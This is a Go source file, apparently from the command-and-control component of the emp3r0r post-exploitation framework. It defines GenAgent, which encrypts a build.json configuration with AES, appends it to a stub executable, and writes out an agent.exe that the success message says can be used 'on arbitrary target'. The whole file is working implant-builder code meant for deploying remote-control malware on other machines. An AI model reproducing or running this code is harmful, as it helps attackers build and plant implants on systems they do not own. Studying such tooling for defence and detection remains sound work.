package cc

import (
	"io/ioutil"
	"strconv"

	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

func GenAgent() {
	buildJSONFile := "./build.json"
	stubFile := "./stub.exe"
	outfile := "./agent.exe"
	CliPrintWarning("Make sure %s and %s exist, and %s must NOT be packed",
		buildJSONFile, stubFile, strconv.Quote(stubFile))

	// read file
	jsonBytes, err := ioutil.ReadFile(buildJSONFile)
	if err != nil {
		CliPrintError("%v", err)
		return
	}

	// encrypt
	key := tun.GenAESKey(agent.OpSep)
	encJSONBytes := tun.AESEncryptRaw(key, jsonBytes)
	if encJSONBytes == nil {
		CliPrintError("Failed to encrypt %s", buildJSONFile)
		return
	}

	// write
	toWrite, err := ioutil.ReadFile(stubFile)
	if err != nil {
		CliPrintError("%v", err)
		return
	}
	toWrite = append(toWrite, []byte(agent.OpSep)...)
	toWrite = append(toWrite, encJSONBytes...)
	err = ioutil.WriteFile(outfile, toWrite, 0755)
	if err != nil {
		CliPrintError("%v", err)
		return
	}

	// done
	CliPrintSuccess("Generated %s from %s and %s, you can use %s on arbitrary target",
		outfile, stubFile, buildJSONFile, outfile)
}
